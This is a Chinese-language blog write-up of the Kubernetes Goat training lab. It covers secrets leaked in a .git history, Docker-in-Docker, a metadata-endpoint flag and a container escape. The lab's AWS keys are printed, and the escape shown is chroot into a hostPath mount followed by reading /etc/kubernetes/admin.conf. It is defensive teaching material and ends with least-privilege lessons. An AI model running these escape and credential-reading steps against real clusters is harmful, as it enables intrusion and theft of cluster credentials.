---
title: "K8s Goat 靶场实战记录"
author: "bx-云安全"
description: "Kubernetes Goat 四个场景实战记录：代码仓库密钥泄露、DIND、Metadata Secrets 与容器逃逸。"
pubDatetime: 2026-02-19
tags:
  - "Kubernetes"
  - "K8s Goat"
  - "容器安全"
  - "渗透实战"
draft: false
slug: "k8s-goat-walkthrough"
---
<meta name="referrer" content="no-referrer" />

# K8s Goat 靶场实战记录

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771508931551-5b306c56-a2b6-4e10-84fc-4b928f32c6c0.png)

这几天挑战了 Kubernetes Goat 这个靶场，整体难度不低，但能覆盖不少实战型容器与集群安全问题。

## 靶场与参考

- 项目仓库: [madhuakula/kubernetes-goat](https://github.com/madhuakula/kubernetes-goat.git)
- 官方文档: [Kubernetes Goat Docs](https://madhuakula.com/kubernetes-goat/docs/)

## Part 1 - Sensitive keys in codebases

### CI / CD 前置理解

CI（Continuous Integration，持续集成）常见流程：

```text
git push
  ↓
拉代码
  ↓
安装依赖
  ↓
跑测试 / 编译
  ↓
生成构建产物
```

CD（Continuous Delivery / Deployment，持续交付 / 部署）常见流程：

```text
构建成功
  ↓
打包 Docker 镜像
  ↓
推送镜像仓库
  ↓
部署到服务器 / Kubernetes / 云
```

### 发现 `.git` 泄露并回溯提交历史

先对站点做信息收集，发现存在 `.git` 泄露。

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771503852819-68f5ab7d-0cb6-45a9-9404-7480d9abb035.png)

抓取仓库后查看提交历史：

```bash
git log
```

```text
commit 905dcec070d86ce60822d790492d7237884df60a (HEAD -> master)
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Fri Nov 6 23:42:28 2020 +0100

    Final release

commit 3292ff3bd8d96f192a9d4eb665fdd1014d87d3df
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Fri Nov 6 23:40:59 2020 +0100

    Updated the docs

commit 7daa5f4cda812faa9c62966ba57ee9047ee6b577
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Fri Nov 6 23:39:21 2020 +0100

    updated the endpoints and routes

commit d7c173ad183c574109cd5c4c648ffe551755b576
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Fri Nov 6 23:31:06 2020 +0100

    Inlcuded custom environmental variables

commit bb2967a6f26fb59bf64031bbb14b4f3e233944ca
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Fri Nov 6 23:28:33 2020 +0100

    Added ping endpoint

commit 599f377bde4c3c5c8dc0d7700194b5b2b0643c0b
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Fri Nov 6 23:24:56 2020 +0100

    Basic working go server with fiber

commit 4dc0726a546f59e0f4cda837a07032c62ee137bf
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Fri Nov 6 23:21:48 2020 +0100

    Initial commit with README
```

可以继续用 `git show` / `git diff` 对可疑提交做差异分析。

### 提取敏感信息

在历史记录中发现敏感信息泄露：

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771503873357-282a75fb-6994-4aa3-be85-9a9997cd9f59.png)

```diff
+[build-code-aws]
+aws_access_key_id = AKIVSHD6243H22G1KIDC
+aws_secret_access_key = cgGn4+gDgnriogn4g+34ig4bg34g44gg4Dox7c1M
+k8s_goat_flag = k8s-goat-51bc78332065561b0c99280f62510bcc
```

## Part 2 - DIND

DIND（Docker-in-Docker）指在一个容器中继续运行 Docker 守护进程，再在其中启动其他容器。

```text
宿主机 Docker
  ↓
容器 A（运行 docker daemon）
  ↓
容器 B / C / D ...
```

常见于 CI 场景：

```text
GitLab CI
GitHub Actions
Jenkins
Drone

CI 任务跑在容器里，但步骤里要执行：
docker build
docker push

容器里默认没有 Docker，因此常见两种方案：
1. Docker Socket 挂载（常见）
2. DIND
```

回到靶场后，先通过命令拼接拿到执行能力，再做枚举。

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771504314290-3b3fed83-e755-490f-8f42-03406a461e25.png)

查看挂载：

```bash
mount
```

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771504792096-41e46934-5e34-4086-8ac7-a1c114053ef3.png)

发现 `custom/containerd/containerd.sock`，可以考虑配合运行时工具进一步探查。

```bash
wget https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.35.0/crictl-v1.35.0-linux-amd64.tar.gz -O /tmp/crictl.tar.gz
```

`crictl` 用于和 Kubernetes 容器运行时（Container Runtime）直接交互。

| 对比项 | `kubectl` | `crictl` |
| --- | --- | --- |
| 操作层级 | Kubernetes | 容器运行时 |
| 通信对象 | API Server | containerd / CRI-O |
| 操作资源 | Pod、Deployment、Service | 容器、镜像、Sandbox |
| 是否需要集群 | 需要 | 不需要（节点即可） |
| 是否跨节点 | 可以 | 仅当前节点 |

相关项目：<https://github.com/kubernetes-sigs/cri-tools>

> 后续 `crictl` 操作示例未完整展示，原因是靶场环境无法访问 GitHub。

## Part 3 - Metadata Secrets

> The Goal:
> To complete this scenario you need to obtain the `k8s-goat-FLAG` flag value in the metadata secrets.

目标是获取元数据机密中的 `k8s-goat-FLAG`。

尝试访问内部 endpoint：

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771503885123-d83329fa-51bf-45db-b5d4-e54bcb23ffbc.png)

发现 `http://metadata-db/`：

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771503893008-f608f573-ddb9-4787-b930-b65a77ba9181.png)

继续访问 `http://metadata-db/latest/`：

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771503900352-29a2c1e1-5ffb-421c-b215-afecfae7cbc2.png)

最终拿到 flag：

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771503911311-53ab8658-b4b3-4512-805a-206581b4244d.png)

```text
{"metadata": "static-metadata", "data": "azhzLWdvYXQtY2E5MGVmODVkYjdhNWFlZjAxOThkMDJmYjBkZjljYWI="}

k8s-goat-ca90ef85db7a5aef0198d02fb0df9cab
```

## Part 4 - Container Escape to the Host System

这个场景的主要攻击路径如下：

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771507314125-5204ec9d-5c08-494a-b47e-760f52a970ce.png)

### 能力枚举

在监控 Pod 中可执行命令，先看能力位：

```bash
capsh --print
```

> `capsh` 用于查看和操作 Linux capabilities（能力位），把传统 root 权限拆成更细粒度的权限集。

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771505608183-9039a598-ce4a-4e64-9d79-d291482219ba.png)

```text
root@system-monitor-deployment-6b78f74bf-4944q:/# capsh --print
Current: =ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
Ambient set =
Current IAB:
Securebits: 00/0x0/1'b0 (no-new-privs=0)
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=0(root)
Guessed mode: HYBRID (4)
```

重点关注 `Bounding set`，它代表当前进程及其子进程可拥有能力的上限。这里出现多个高危能力，说明容器权限过高：

- `cap_sys_admin`（高危，涉及挂载、namespace 等）
- `cap_sys_module`（可加载内核模块）
- `cap_sys_rawio`（原始 I/O）
- `cap_net_admin`（网络配置能力）
- `cap_sys_ptrace`（可 ptrace 其他进程）
- `cap_bpf` / `cap_perfmon`（底层内核与性能能力）

`secure-*` 全部为 `no`，且身份为 `uid=0(root)`，说明几乎没有降权和能力收敛。

### HostPath 与宿主机切换

继续看挂载信息（条目较多，这里仅展示截图）：

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771506336068-c9d3e5f4-eea8-467b-9229-f6e1b49b2818.png)

发现 `/host-system` 目录，进一步枚举后基本可以判断是宿主机文件系统映射：

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771506454482-a4f223a3-371c-4f4b-a738-30d33800027d.png)

```bash
chroot /host-system bash
```

含义是把当前进程根目录切换到 `/host-system` 并启动 `bash`。

切换后继续横向探查：

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771506589114-62a617e4-1c41-405a-80b5-b4a60d3cba43.png)

```bash
cat /etc/kubernetes/admin.conf
```

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771506736455-5b7ad99a-38f4-41eb-899d-010078fdf185.png)

这一步意味着已经可访问宿主机/控制平面的敏感配置。在真实环境中，`admin.conf` 往往包含访问 API Server 的高权限凭据或证书，风险极高。

## 总结

1. 核心仍是最小权限原则（Least Privilege）。
2. `privileged` 容器通常接近宿主机级能力。
3. HostPath 本质上是在把宿主机文件系统暴露给容器，必须严格控制。
